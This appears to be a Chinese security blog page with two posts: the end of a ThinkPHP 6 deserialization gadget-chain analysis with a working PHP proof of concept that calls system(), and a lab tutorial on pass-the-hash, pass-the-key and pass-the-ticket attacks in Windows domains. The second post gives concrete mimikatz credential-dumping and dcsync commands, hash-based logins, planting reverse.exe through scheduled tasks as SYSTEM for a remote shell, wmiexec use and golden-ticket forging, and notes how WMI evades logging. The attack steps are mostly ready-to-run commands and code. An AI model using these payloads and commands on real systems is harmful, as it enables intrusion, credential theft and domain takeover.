<p>跟进<code>toArray</code>方法,漏洞方法是<code>getAtrr</code>默认就会触发，只需把<code>$data</code>设为数组就行。</p>
<p><img src="/images/225.png"></p>
<pre><code>public function toArray(): array
    &#123;
        $item       = [];
        $hasVisible = false;

        foreach ($this-&gt;visible as $key =&gt; $val) &#123;
            if (is_string($val)) &#123;
                if (strpos($val, &#39;.&#39;)) &#123;
                    [$relation, $name]          = explode(&#39;.&#39;, $val);
                    $this-&gt;visible[$relation][] = $name;
                &#125; else &#123;
                    $this-&gt;visible[$val] = true;
                    $hasVisible          = true;
                &#125;
                unset($this-&gt;visible[$key]);
            &#125;
        &#125;

        foreach ($this-&gt;hidden as $key =&gt; $val) &#123;
            if (is_string($val)) &#123;
                if (strpos($val, &#39;.&#39;)) &#123;
                    [$relation, $name]         = explode(&#39;.&#39;, $val);
                    $this-&gt;hidden[$relation][] = $name;
                &#125; else &#123;
                    $this-&gt;hidden[$val] = true;
                &#125;
                unset($this-&gt;hidden[$key]);
            &#125;
        &#125;

        // 合并关联数据
        $data = array_merge($this-&gt;data, $this-&gt;relation);

        foreach ($data as $key =&gt; $val) &#123;
            if ($val instanceof Model || $val instanceof ModelCollection) &#123;
                // 关联模型对象
                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123;
                    $val-&gt;visible($this-&gt;visible[$key]);
                &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;
                    $val-&gt;hidden($this-&gt;hidden[$key]);
                &#125;
                // 关联模型对象
                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;
                    $item[$key] = $val-&gt;toArray();
                &#125;
            &#125; elseif (isset($this-&gt;visible[$key])) &#123;
                $item[$key] = $this-&gt;getAttr($key);
            &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;
                $item[$key] = $this-&gt;getAttr($key);</code></pre>
<p>跟进<code>getAttr</code>方法，漏洞方法是<code>getValue</code>，但传入<code>getValue</code>方法中的<code>$value</code>是由<code>getData</code>方法得到的。</p>
<p><img src="/images/226.png"></p>
<pre><code>    public function getAttr(string $name)
    &#123;
        try &#123;
            $relation = false;
            $value    = $this-&gt;getData($name);
        &#125; catch (InvalidArgumentException $e) &#123;
            $relation = $this-&gt;isRelationAttr($name);
            $value    = null;
        &#125;

        return $this-&gt;getValue($name, $value, $relation);</code></pre>
<p>跟进<code>getData</code>方法，<code>$this-&gt;data</code>可控，<code>$fieldName</code>来自<code>getRealFieldName</code>方法</p>
<p><img src="/images/227.png"></p>
<p>跟进<code>getRealFieldName</code>方法，默认直接返回传入的参数。所以<code>$fieldName</code>也可控，也就是传入<code>getValue</code>的<code>$value</code>参数可控。</p>
<p><img src="/images/228.png"></p>
<p>跟进<code>getValue</code>方法，在Thinkphp6.0.8触发的漏洞点在①处，但在Thinkphp6.0.12时已经对传入的<code>$closure</code>进行判断。此次漏洞方法的<code>getJsonValue</code>方法。但需要经过两个if判断，<code>$this-&gt;withAttr</code>和<code>$this-&gt;json</code>都可控，可顺利进入<code>getJsonValue</code>方法。</p>
<p><img src="/images/229.png"></p>
<pre><code>   protected function getValue(string $name, $value, $relation = false)
    &#123;
        // 检测属性获取器
        $fieldName = $this-&gt;getRealFieldName($name);

        if (array_key_exists($fieldName, $this-&gt;get)) &#123;
            return $this-&gt;get[$fieldName];
        &#125;

        $method = &#39;get&#39; . Str::studly($name) . &#39;Attr&#39;;
        if (isset($this-&gt;withAttr[$fieldName])) &#123;
            if ($relation) &#123;
                $value = $this-&gt;getRelationValue($relation);
            &#125;
            if (in_array($fieldName, $this-&gt;json) &amp;&amp; is_array($this-&gt;withAttr[$fieldName])) &#123;
                $value = $this-&gt;getJsonValue($fieldName, $value);</code></pre>
<p>跟进<code>getJsonValue</code>方法，触发漏洞的点在<code>$closure($value[$key], $value)</code>只要令<code>$this-&gt;jsonAssoc</code>为<code>True</code>就行。</p>
<p><code>$closure</code>和<code>$value</code>都可控。</p>
<p><img src="/images/230.png"></p>
<pre><code> protected function getJsonValue($name, $value)
    &#123;
        if (is_null($value)) &#123;
            return $value;
        &#125;

        foreach ($this-&gt;withAttr[$name] as $key =&gt; $closure) &#123;
            if ($this-&gt;jsonAssoc) &#123;
                $value[$key] = $closure($value[$key], $value);</code></pre>
<h2 id="完整POP链条"><a href="#完整POP链条" class="headerlink" title="完整POP链条"></a>完整POP链条</h2><p><img src="/images/231.png"></p>
<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><pre><code>&lt;?php

namespace think&#123;

    abstract class Model&#123;
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;

        function __construct($obj = &#39;&#39;)&#123;
            $this-&gt;lazySave = True;
            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;dir&#39;]];
            $this-&gt;exists = True;
            $this-&gt;table = $obj;
            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];
            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];
            $this-&gt;jsonAssoc = True;
        &#125;
    &#125;
&#125;

namespace think\model&#123;
    use think\Model;
    class Pivot extends Model&#123;

    &#125;
&#125;

namespace&#123;
    echo(base64_encode(serialize(new think\model\Pivot(new think\model\Pivot()))));
&#125;</code></pre>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="/images/232.png"></p>
<p><img src="/images/233.png"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2022/01/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fpass%E7%B3%BB%E5%88%97%E6%94%BB%E5%87%BB/">
                内网渗透pass系列攻击
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-01-29</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="内网渗透三种最常用的pass系列攻击："><a href="#内网渗透三种最常用的pass系列攻击：" class="headerlink" title="内网渗透三种最常用的pass系列攻击："></a>内网渗透三种最常用的pass系列攻击：</h2><ul>
<li>pass the hash （哈希传递攻击，简称pth）</li>
<li>pass the ticket（票据传递攻击，简称ptt）</li>
<li>pass the key    （密钥传递攻击，简称ptk）</li>
</ul>
<p><strong>环境</strong></p>
<p><img src="/images/187.png"></p>
<h3 id="哈希传递攻击-PTH攻击"><a href="#哈希传递攻击-PTH攻击" class="headerlink" title="哈希传递攻击(PTH攻击)"></a>哈希传递攻击(PTH攻击)</h3><p>在域环境下，检测密码不是先将Hash解密再验证是否正确的。在验证输入的账号密码是否正确的时候，是通过验证Hash是否相同来进行校验的。也就是说，或许我们可以通过获取的Hash来伪造管理员账号密码登录，也就是Hash传递，又叫PTH，通过将获取的NTLM密文传递到验证登录的机器，绕过正常验证进行登录系统。</p>
<h4 id="PTH回顾"><a href="#PTH回顾" class="headerlink" title="PTH回顾"></a><strong>PTH回顾</strong></h4><p>在后渗透中，获取会话之后，首先就是要获取凭证和NTLM hash值。从红队的视角来看，Pth只是横向渗透的开始。获得hash之后，攻击者就可以对它加以利用，比如他们可以尝试破解，但破解hash值还是比较困难的，费时费力，还不一定能搞到正确的密码，于是就诞生了另一种方法。我们来看一下认证过程，认证期间，首先是获取用户输入的密码，然后将其加密得到hash值，然后再把这个加密的hash值用于后期的身份认证。初始认证完成之后，windows就把这个hash值保存到内存中，这样用户在使用过程中就不用重复的输入密码。在凭证转存中，我们可以看到，我们提取了很多的hash值。作为攻击者，我们是不知道密码的，所以在认证的时候，我们直接提供hash值，不用提供密码，windows就会与保存的hash值对比，一致的话，认证就会通过。这就是所谓的pth攻击了。</p>
<h4 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a><strong>可利用的协议</strong></h4><p>IPC</p>
<p>SMB</p>
<p>WMI</p>
<p>RPC</p>
<h4 id="1-利用IPC-进行攻击"><a href="#1-利用IPC-进行攻击" class="headerlink" title="1.利用IPC$进行攻击"></a>1.利用IPC$进行攻击</h4><h5 id="IPC-概念"><a href="#IPC-概念" class="headerlink" title="IPC$概念"></a>IPC$概念</h5><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
<pre><code>IPC$的使用条件：
开放了139、445端口；
目标开启IPC$文件共享；
获取用户账号密码。

139 或 445 端口开启:ipc 连接可以实现远程登录及对默认共享的访问;而 139 端口 的开启表示 netbios 协议的应用，我们可以通过 139、445 端口实现对共享文件/打印机的访 问</code></pre>
<p>在内网中，默认就会开启IPC$共享文件服务，默认会将C盘共享出来，也就是说，我们可以通过IPC获取目标C盘的权限。</p>
<h5 id="IPC-常用命令"><a href="#IPC-常用命令" class="headerlink" title="IPC$常用命令"></a>IPC$常用命令</h5><table>
<thead>
<tr>
<th>net use</th>
<th>查看当前连接的IPC$</th>
</tr>
</thead>
<tbody><tr>
<td>net use * /del</td>
<td>删除IPC$连接</td>
</tr>
<tr>
<td>net use \\192.168.1.1\ipc$ 密码 /user:域\账号</td>
<td>连接域内IP地址为192.168.1.1的主机</td>
</tr>
<tr>
<td>dir \\192.168.1.1\c$</td>
<td>列出连接的192.168.1.1的C盘文件</td>
</tr>
<tr>
<td>copy c:/12.txt \\192.168.1.1\c$\2.txt</td>
<td>复制本地c盘的12.txt文件到192.168.1.1的c盘并保存为2.txt</td>
</tr>
</tbody></table>
<h5 id="IPC-命令执行"><a href="#IPC-命令执行" class="headerlink" title="IPC$命令执行"></a>IPC$命令执行</h5><p>0.创建连接</p>
<pre><code>net use \\192.168.88.135\ipc$ chen@2021 /user:edu.org\Administrator 
#可以使用其他非管理员用户进行连接，但会拒绝访问，通常使用Administrator</code></pre>
<p>1.通过at命令制定计划进行命令执行。(新版本at命令已经废弃)</p>
<pre><code>at \\192.168.1.1 11:15am cmd /c &quot;whoami&quot;</code></pre>
<p>2.通过schtasks进行计划任务命令执行</p>
<pre><code>copy C:\reverse.exe \\192.168.88.131\c$\reverse.exe 

schtasks /create /tn task1 /tr &quot;C:\reverse.exe&quot; /sc MINUTE /mo 1 /s 192.168.88.131 /RU system /f

schtasks /run /tn task1 /s 192.168.88.131</code></pre>
<h5 id="IPC-常见错误号"><a href="#IPC-常见错误号" class="headerlink" title="IPC$常见错误号"></a>IPC$常见错误号</h5><pre><code>错误号 5，拒绝访问 : 很可能你使用的用户不是管理员权限的，先提升权限;
错误号 51，Windows 无法找到网络路径 : 网络有问题;
错误号 53，找不到网络路径 : ip 地址错误;目标未开机;目标 lanmanserver 服务未启动; 目标有防火墙(端口过滤);
错误号 67，找不到网络名 : 你的 lanmanworkstation 服务未启动;目标删除了 ipc$;
错误号 1219，提供的凭据与已存在的凭据集冲突:你已经和对方建立了一个 ipc$，请删除再连。
错误号 1326，未知的用户名或错误密码:原因很明显了;
错误号 1792，试图登录，但是网络登录服务没有启动:目标 NetLogon 服务未启动。(连接 域控会出现此情况)
错误号 2242，此用户的密码已经过期:目标有帐号策略</code></pre>
<h4 id="2-利用mimikatz进行PTH攻击"><a href="#2-利用mimikatz进行PTH攻击" class="headerlink" title="2.利用mimikatz进行PTH攻击"></a><strong>2.利用mimikatz进行PTH攻击</strong></h4><p>以管理员身份运行mimikatz.exe，然后执行以下命令</p>
<pre><code>privilege::debug

sekurlsa::logonpasswords #hash和明文密码获取

sekurlsa::pth /user:administrator /domain:edu.org /ntlm:414c0887a2140df4d6f2daa20d2adf6f</code></pre>
<p><img src="/images/180.png"></p>
<p>执行完之后会弹出一个命令提示符，执行dir \\192.168.88.131\c$成功无需账号密码获取了域控机器的c盘的权限，列出了c盘的文件</p>
<p>可以把域内IP都遍历一遍，弹出目录的就是存在密码一样。</p>
<p><img src="/images/181.png"></p>
<h5 id="①利用Psexec进行交互"><a href="#①利用Psexec进行交互" class="headerlink" title="①利用Psexec进行交互"></a>①利用Psexec进行交互</h5><p>提权获取一个域控机器的cmd命令提示符，移动到psexec所在目录，执行以下命令（因为psexec是微软自带的工具所以在白名单内)，不过很多杀软已经列入黑名单了</p>
<pre><code>psexec64 \\192.168.88.131 cmd</code></pre>
<p><img src="/images/186.png"></p>
<h5 id="②计划任务反弹shell"><a href="#②计划任务反弹shell" class="headerlink" title="②计划任务反弹shell"></a><strong>②计划任务反弹shell</strong></h5><ul>
<li>(IPC$未登录,但已知明文账号密码情况)</li>
</ul>
<pre><code>C:\Windows\system32&gt;copy C:\reverse.exe \\192.168.88.131\c$\reverse.exe 
#复制木马文件到目标机器

C:\Windows\system32&gt;schtasks /create /tn task1 /U  edu.org\eas  /P chen@2021  /tr &quot;C:\reverse.exe&quot; /sc MINUTE /mo 1 /s 192.168.88.131 /RU system /f
#创建计划任务

C:\Windows\system32&gt;schtasks /run /tn task1 /U  edu.org\eas  /P chen@2021 /s 192.168.88.131
#运行计划任务

C:\Windows\system32&gt;schtasks /delete /tn task1 /f /U  edu.org\eas  /P chen@2021 /s 192.168.88.131
#删除计划任务</code></pre>
<p><img src="/images/183.png"></p>
<ul>
<li>IPC$已登录情况，省略账号密码</li>
</ul>
<pre><code>C:\Windows\system32&gt;schtasks /create /tn task1 /tr &quot;C:\reverse.exe&quot; /sc MINUTE /mo 1 /s 192.168.88.131 /RU system /f
成功: 成功创建计划任务 &quot;task1&quot;。

C:\Windows\system32&gt;schtasks /run /tn task1 /s 192.168.88.131
成功: 尝试运行 &quot;task1&quot;。</code></pre>
<p><img src="/images/184.png"></p>
<p>一分钟后MSF接收到shell</p>
<p><img src="/images/185.png"></p>
<h4 id="3-利用SMB进行PTH攻击"><a href="#3-利用SMB进行PTH攻击" class="headerlink" title="3.利用SMB进行PTH攻击"></a>3.利用SMB进行PTH攻击</h4><pre><code>利用条件
开启445端口
445端口没被过滤</code></pre>
<h5 id="①msf-windows-smb-psexec模块"><a href="#①msf-windows-smb-psexec模块" class="headerlink" title="①msf-windows/smb/psexec模块"></a>①msf-windows/smb/psexec模块</h5><p><img src="/images/182.png"></p>
<h5 id="②kali自带工具pth-smbclient"><a href="#②kali自带工具pth-smbclient" class="headerlink" title="②kali自带工具pth-smbclient"></a>②kali自带工具pth-smbclient</h5><pre><code>pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$</code></pre>
<h4 id="4-利用WMI进行PTH攻击"><a href="#4-利用WMI进行PTH攻击" class="headerlink" title="4.利用WMI进行PTH攻击"></a>4.利用WMI进行PTH攻击</h4><p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows/">wmi.exe工具下载</a></p>
<h5 id="WMIC的利用"><a href="#WMIC的利用" class="headerlink" title="WMIC的利用"></a><strong>WMIC的利用</strong></h5><p>WMI的全名为“Windows Management Instrumentation”。从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。WMI为用户提供了基本信息，并且让用户有权限执行各种管理任务。这种权限是通过身份认证来实现的。当我们有了凭证的时候，我们就可以执行pth攻击来通过身份认证了。</p>
<p>自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是攻击者逐渐开始使用WMI进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p>
<pre><code>利用条件
WMI 服务开启(默认开启)
目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)
135 端口未被过滤(防火墙拦截)</code></pre>
<pre><code>wmiexec.exe -hashes 00000000000000000000000000000000:414c0887a2140df4d6f2daa20d2adf6f edu.org/Administrator@192.168.88.135</code></pre>
<p><img src="/images/188.png"></p>
<pre><code>wmiexec.exe administrator:chen@2021@192.168.88.135</code></pre>
<p><img src="/images/190.png"></p>
<ul>
<li>利用系统自带的工具 wmic 在目标主机上执行任意命令</li>
</ul>
<p>远程创建进程</p>
<pre><code>wmic /node:192.168.88.135 /user:edu.org\Administrator /password:chen@2021 process call create &quot;cmd.exe /c echo 123 &gt; c:\1.txt&quot;</code></pre>
<p>缺点:无法回显命令</p>
<p><img src="/images/189.png"></p>
<h3 id="密钥传递攻击-PTK攻击"><a href="#密钥传递攻击-PTK攻击" class="headerlink" title="密钥传递攻击(PTK攻击)"></a>密钥传递攻击(PTK攻击)</h3><p>ptk是在域中攻击kerberos认证的一种方式，原理是通过获取用户的aes hmac，通过kerberos认证，可在NTLM认证被禁止的情况下用来实现类似pth的功能。</p>
<h4 id="利用mimikatz获取aes"><a href="#利用mimikatz获取aes" class="headerlink" title="利用mimikatz获取aes"></a>利用mimikatz获取aes</h4><pre><code>mimikatz # privilege::debug

mimikatz # sekurlsa::ekeys</code></pre>
<p><img src="/images/191.png"></p>
<h4 id="利用MSF获取aes"><a href="#利用MSF获取aes" class="headerlink" title="利用MSF获取aes"></a>利用MSF获取aes</h4><p><strong>mimikatz模块的使用需要Administrator权限或者System权限</strong>。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。</p>
<p>先提权，然后进程迁移到一个x64又是管理员的进程</p>
<p><img src="/images/192.png"></p>
<p>加载mimikatz模块，执行mimikatz命令，获取aes_hmac</p>
<p><img src="/images/193.png"></p>
<h4 id="利用Cobalt-Strike获取aes"><a href="#利用Cobalt-Strike获取aes" class="headerlink" title="利用Cobalt Strike获取aes"></a>利用Cobalt Strike获取aes</h4><pre><code>beacon&gt; mimikatz &quot;sekurlsa::ekeys&quot;</code></pre>
<p><img src="/images/194.png"></p>
<h4 id="攻击样例"><a href="#攻击样例" class="headerlink" title="攻击样例"></a>攻击样例</h4><p>在实际上，PTK传递比PTH传递用的少，因为PTK传递需要一个前提条件，<strong>主机必须打了补丁kb2871997</strong></p>
<pre><code>sekurlsa::pth /user:administrator /domain:edu.org /aes256:30d6609fbfd3209395999076705feb371739f36da318aa90b33c19b75241b1aa</code></pre>
<p>在弹出的cmd里利用dir进行域内所有机器的遍历</p>
<p>dir \\192.168.88.0\c$ …..dir \\192.168.88.255\c$，如果<strong>不是显示账号密码不正确</strong>就说明目标机器的hash和该机器一样。</p>
<p><img src="/images/181.png"></p>
<h3 id="票据传递攻击-PTT攻击"><a href="#票据传递攻击-PTT攻击" class="headerlink" title="票据传递攻击(PTT攻击)"></a>票据传递攻击(PTT攻击)</h3><h4 id="Kerberos认证"><a href="#Kerberos认证" class="headerlink" title="Kerberos认证"></a>Kerberos认证</h4><p>弄清Kerberos认证过程，最有利于帮助我们理解域内的金票和银票。Kerberos是一种网络身份验证协议,旨在通过密钥加密技术为客户端/服务器应用程序提供身份验证,主要用在域环境下的身份验证。</p>
<p>域控的账号密码可以登录域内任意一台主机，那么主机是如何检测域控账号密码是否正确的呢？检验账号密码可以有两种方法，询问域控或者设置一个专门检测账号密码是否正确的第三方中心。在域中便使用到了第三方中心来检验输入的账号密码是否相同。这种第三方中心叫KDC密钥分发中心。</p>
<p><img src="/images/195.png"></p>
<h5 id="几个相关的名词"><a href="#几个相关的名词" class="headerlink" title="几个相关的名词"></a>几个相关的名词</h5><h6 id="①KDC"><a href="#①KDC" class="headerlink" title="①KDC"></a><strong>①KDC</strong></h6><p>KDC（Key Distribution Center）密钥分发中心，维护所有账户的名称和Master Key（key的hash code）<br>在KDC中又分为两个部分：Authentication Service(AS,身份验证服务)和Ticket Granting Service(TGS,票据授权服务)</p>
<h6 id="②AS"><a href="#②AS" class="headerlink" title="②AS"></a><strong>②AS</strong></h6><p>授权服务（Authorization Server），对于上面的流程1，提供初始授权认证，用户表明需求并使用密码对请求进行加密，AS用提供的密码对请求进行解密后得到的请求内容，返回给用户一个TGT（票据授权票据 ticket granting tickets）（用一个密码加密）</p>
<h6 id="③TGS"><a href="#③TGS" class="headerlink" title="③TGS"></a><strong>③TGS</strong></h6><p>用户得到TGT之后使用TGT去访问TGS（票据授权中心Ticket Granting Server），</p>
<p>TGS验证TGT后（使用密钥解密），返回一个Ticket给用户；用户得到Ticket后去访问Server，Server收到Ticket和KDC进行验证，通过后提供服务</p>
<h6 id="④DC和AD"><a href="#④DC和AD" class="headerlink" title="④DC和AD"></a><strong>④DC和AD</strong></h6><p>DC是Domain Controller的缩写,即域控制器;AD是Active Directory的缩写,即活动目录。<br> DC中有一个特殊用户叫做:krbtgt,它是一个无法登录的账户,是在创建域时系统自动创建的,在整个kerberos认证中会多次用到它的Hash值去做验证。<br> AD会维护一个Account Database(账户数据库). 它存储了域中所有用户的密码Hash和白名单。只有账户密码都在白名单中的Client才能申请到TGT</p>
<h6 id="⑤票据"><a href="#⑤票据" class="headerlink" title="⑤票据"></a><strong>⑤票据</strong></h6><p>在内网渗透中，票据分为白银票据和黄金票据。分别对应域普通用户的票据和域管理员的票据。票据就是Kerberos认证协议的Ticket，因为已经经过了AS和TGS的校验，所以获取了票据之后，可以任意登录目标主机</p>
<h6 id="⑥krbtgt用户"><a href="#⑥krbtgt用户" class="headerlink" title="⑥krbtgt用户"></a>⑥krbtgt用户</h6><p>在查询域内用户的时候，总会看到一个用户叫krbtgt。krbtgt账户其实就是KDC秘钥分发中心用的超管账户。我们拿着krbtgt账户的票据，去访问域内机器，目标主机会认为我们是KDC秘钥分发中心，所以直接给了最高的权限允许我们访问。</p>
<h5 id="kerberos认证过程"><a href="#kerberos认证过程" class="headerlink" title="kerberos认证过程"></a>kerberos认证过程</h5><h6 id="粗略的验证流程"><a href="#粗略的验证流程" class="headerlink" title="粗略的验证流程"></a><strong>粗略的验证流程</strong></h6><p>如果把 Kerberos 中的票据一类比作一张门禁卡,那么 Client 端就是住客,Server 端就是房间,而 KDC 就是小区的门禁。住客想要进入小区,就需要手里的门禁卡与门禁想对应,只有通过门禁的检验,才能打开门禁进入小区。</p>
<p>需要注意的是,小区门禁卡只有一张,而Kerberos认证则需要两张票</p>
<h6 id="详解认证流程"><a href="#详解认证流程" class="headerlink" title="详解认证流程"></a><strong>详解认证流程</strong></h6><p>当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份,验证通过后AS会发放的一个TGT,随后Client再次向TGS证明自己的身份,验证通过后TGS会发放一个ST,最后Client向 Server 发起认证请求,认证通过后，开始和Client交互。</p>
<p><strong>第一步Client与AS交互</strong></p>
<p><strong>请求：</strong></p>
<p>Client向KDC的Authentication Service发送Authentication Service Request（KRB_AS_REQ）。</p>
<p>内容包含：</p>
<ul>
<li>Pre-authentication data：包含用以证明自己身份的信息。就是证明自己知道自己声称的那个account的Password。一般地，它的内容是一个被Client的Master key加密过的Timestamp。</li>
<li>Client name &amp; realm</li>
<li>KDC的Ticket Granting Service的Server Name</li>
</ul>
<p><strong>响应：</strong></p>
<p>AS（Authentication Service）通过它接收到的KRB_AS_REQ验证发送方的是否是在Client name &amp; realm中声称的那个人，也就是说要验证发送放是否知道Client的Password。所以AS只需从Account Database中提取Client对应的Master Key对Pre-authentication data进行解密，如果是一个合法的Timestamp，则可以证明发送方提供的是正确无误的密码。</p>
<p>验证通过之后，AS将一份Authentication Service Response（KRB_AS_REP）发送给Client。</p>
<p>KRB_AS_REQ主要包含两个部分：</p>
<ul>
<li>被Client的Master Key加密过的Logon Session Key</li>
<li>被自己（KDC）的Key加密过的TGT。TGT主要包含三部分内容：</li>
</ul>
<p>（1）经过KDC中的krbtgt的密码HASH加密的 Logon Session Key(登录会话密钥)（2）Client name &amp; realm （3）End Time：TGT的到期时间</p>
<p>Client通过自己的Master Key对第一部分解密获得Logon Session Key之后，携带着TGT便可以进入下一步：TGS（Ticket Granting Service）Exchange。</p>
<p><strong>第二步Client与TGS交互</strong></p>
<p><strong>请求：</strong></p>
<p>Client向KDC中的TGS（Ticket Granting Service）发送Ticket Granting Service Request（KRB_TGS_REQ）</p>
<p>内容包括：</p>
<ul>
<li><p>TGT：Client通过AS Exchange获得的被KDC Key加密的Ticket Granting Ticket。</p>
</li>
<li><p>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它用Logon Session Key来进行加密。</p>
<p>内容包括：（1）Client Info （2）Timestamp</p>
</li>
<li><p>Client name &amp; realm</p>
</li>
<li><p>Server name &amp; realm：这是Client试图访问的那个Server</p>
</li>
</ul>
<p><strong>响应：</strong></p>
<p>TGS先通过自己的Master Key对Client提供的TGT进行解密，从而获得这个Logon Session Key。再通过这个Logon Session Key解密Authenticator进行验证。TGS验证通过后发ST(Service Ticket)票。</p>
<p>认证通过后TGS生成使用Logon Session Key（SKDC-Client）加密过用于Client和Server之间通信的Session Key（SServer-Client），Server的Master Key进行加密的ST(Service Ticket)</p>
<p>内容包括：</p>
<ul>
<li><p>经过 Logon session key加密的Client和Server之间的Session Key</p>
</li>
<li><p>经过Server的Master Key进行加密的ST(Service Ticket)。</p>
</li>
</ul>
<p>Ticket包含以下一些内容：<br> （1）Session Key （2）Client name &amp; realm（3）End Time：Ticket的到期时间</p>
<p>Client 收到TGS的响应，使用 Logon session key，解密第一部分后获得 Session Key （注意区分 Logon Session Key 与 Session Key 分别是什么步骤获得的，及其的区别）。有了 Session Key 和 ST(Service Ticket)， Client 就可以直接和 Server 进行交互，而无须在通过 KDC 作中间人了。</p>
<p><strong>第三步Client与Server交互</strong></p>
<p>Client向Server发送KRB_AP_REQ</p>
<p>内容包括：</p>
<ul>
<li><p>Ticket：Client 通过TGS Exchange获得的被Server Key加密的Ticket</p>
</li>
<li><p>Authenticator：用以证明Ticket的拥有者是否就是自己，所以用Session Key进行加密。</p>
<p>内容包括：（1）Client Info（2）Timestamp</p>
</li>
<li><p>Flag：用于表示Client是否需要进行双向验证</p>
</li>
</ul>
<p><strong>响应：</strong></p>
<p>Server接收到Request之后,首先通过自己的Master Key(krbtgt的密码hash处理)解密ST，从而获得Session Key（SServer-Client）。通过Session Key（SServer-Client）解密Authenticator，进而验证对方的身份。验证成功，让Client访问需要访问的资源，否则直接拒绝对方的请求。</p>
<p>对于需要进行双向验证，Server从Authenticator提取Timestamp，使用Session Key（SServer-Client）进行加密，并将其发送给Client用于Client验证Server的身份。</p>
<p><strong>双向认证：</strong><br> 到目前为止，服务端已经完成了对客户端的验证，但是，整个认证过程还没有结束。接下来就是Client对Server进行验证以确保Client所访问的不是一个钓鱼服务.</p>
<p><strong>Client验证Server：</strong><br> Server需要将Authenticator3中解密出来的Timestamp再次用Session Key进行加密,并发送给Client。Client再用缓存Session Key进行解密,如果Timestamp和之前的内容完全一样,则可以证明此时的Server是它想访问的Server。</p>
<h4 id="黄金票据伪造-Golden-Ticket"><a href="#黄金票据伪造-Golden-Ticket" class="headerlink" title="黄金票据伪造(Golden Ticket)"></a>黄金票据伪造(Golden Ticket)</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<h5 id="伪造金票的所需条件"><a href="#伪造金票的所需条件" class="headerlink" title="伪造金票的所需条件"></a><strong>伪造金票的所需条件</strong></h5><pre><code>1、域名称
2、域的krbtgt用户的SID
3、域的krbtgt账号的HASH
4、伪造任意用户名</code></pre>
<h5 id="HASH和SID获取"><a href="#HASH和SID获取" class="headerlink" title="HASH和SID获取"></a>HASH和SID获取</h5><p>上传mimikatz到域控主机,以管理员权限运行CMD</p>
<p>执行以下命令获取krbtgt用户的hash</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:edu.org /all /csv&quot; &quot;exit&quot;&gt;log.txt</code></pre>
<p><img src="/images/196.png"></p>
<p>再执行以下命令可以看到krbtgt用户的SID</p>
<pre><code>lsadump::dcsync /domain:edu.org /user:krbtgt</code></pre>
<p><img src="/images/197.png"></p>
<p>注：原Object Security ID最后面有个-502是作为标识的，在制作时需要手动删除</p>
<h5 id="黄金票据制作"><a href="#黄金票据制作" class="headerlink" title="黄金票据制作"></a>黄金票据制作</h5><pre><code>1、/user: 指定伪造的用户名，一般是Administrator
2、/sid: 域的sid值
3、/domain: 指定域名
4、/krbtgt: 域内用户krbtgt的ntlm hash值</code></pre>
<pre><code>kerberos::golden /user:Administrator /sid:域内sid /krbtgt:ntlm-hash /domain:域名 /ticket:ticket.kirbi

kerberos::golden /user:Administrator /sid:S-1-5-21-3658974542-4157274802-4269447764 /krbtgt:129d836ceeac69cbb52340ef1bbdc6d3 /domain:edu.org /ticket:ticket.kirbi</code></pre>
<p><img src="/images/199.png"></p>
<p>先通过kerberos::purge清空票据缓存；kerberos::list列出票据显示为空，说明清空了所以票据</p>
<pre><code>kerberos::purge
kerberos::list</code></pre>
<p><img src="/images/200.png"></p>
<p>把票据载入内存</p>
<pre><code>kerberos::ptt ticket.kirbi</code></pre>
<p><img src="/images/198.png"></p>
